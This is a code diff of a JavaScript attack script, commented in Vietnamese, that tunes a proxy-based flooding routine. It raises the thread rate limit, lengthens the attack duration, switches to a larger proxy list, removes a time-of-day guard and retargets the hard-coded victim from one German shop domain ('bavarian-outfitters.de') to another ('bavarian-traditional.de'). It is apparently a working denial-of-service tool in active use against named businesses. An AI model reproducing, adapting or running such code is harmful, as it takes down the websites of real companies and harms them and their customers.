@@ -8,20 +8,20 @@ let type = 1;
 let index = 4;
 let time = 30;
 let threads = 15;
-let rate_limit = 10;
+let rate_limit = 20;
 async function attack(host){
     let arr = [20, 25, 30, 35, 27];
     arr = [30, 35, 33, 40, 34];
-    arr = [40, 45, 43, 35, 50];
+    // arr = [50, 60, 70, 80, 90];
     // const arr = [10, 15, 20, 17, 19];
     // const arr = [20, 21, 22, 23, 24];
 // random index từ 0 -> arr.length - 1
-    time = arr[Math.floor(Math.random() * arr.length)];
+    time = 60;//arr[Math.floor(Math.random() * arr.length)];
     // proxy_file = 'proxy_'+index+'.txt';
     if (type === 1) {
         proxy_file = './lst-proxy/proxy_'+index+'.txt';
     }
-    proxy_file = './1000_ger.txt';
+    proxy_file = './5000.txt';
 /*    else {
         console.log('Go here')
         proxy_file = 'proxy1.txt';
@@ -257,15 +257,15 @@ async function getStatusReport(url){
 }
 async function run(host){
     const now = new Date();
-    if (now.getHours() === 2) {
+/*    if (now.getHours() === 2) {
         console.log("Đúng 3 giờ sáng");
         return
     } else {
         console.log(now.getHours() + ' Giờ');
-    }
+    }*/
     let resp = await attack(host);
     // let resp = await attackStatic(host);
-    let timeOut = 1000 * 60 * 3;
+    let timeOut = 1000 * 60;
     let remaining = timeOut;
 
     function updateTimer() {
@@ -333,12 +333,13 @@ function msUntilNext(hour, minute = 0) {
     if (target <= now) target.setDate(target.getDate() + 1);
     return target - now;
 }
-let host = 'https://bavarian-outfitters.de/';
+let host = 'https://bavarian-traditional.de/';
 run(host)
+// attack(host);
 // const delay = msUntilNext(13, 0); // 13:00
 // console.log(`Sẽ chạy sau ${Math.round(delay/1000)} giây (lúc 13:00).`);
-// let t = 1000 * 60 * 2;
-// setTimeout(() => run(host), t);
+// // let t = 1000 * 60 * 2;
+// setTimeout(() => run(host), delay);
 
 // let interval = setInterval(async function(){
 //     connect();
